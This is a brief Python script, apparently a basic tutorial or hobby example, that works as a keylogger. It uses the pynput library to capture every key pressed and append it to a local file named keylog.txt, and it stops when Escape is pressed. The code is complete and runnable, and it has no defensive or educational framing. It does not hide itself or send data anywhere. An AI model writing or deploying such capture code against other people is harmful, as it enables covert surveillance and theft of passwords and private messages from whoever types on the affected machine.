from pynput import keyboard  # type: ignore

# Specify the file to which keystrokes will be logged
log_file = "keylog.txt"

def on_press(key):
    try:
        # Log the key pressed
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

def on_release(key):
    # Optionally, you can stop the listener by checking for a specific key
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
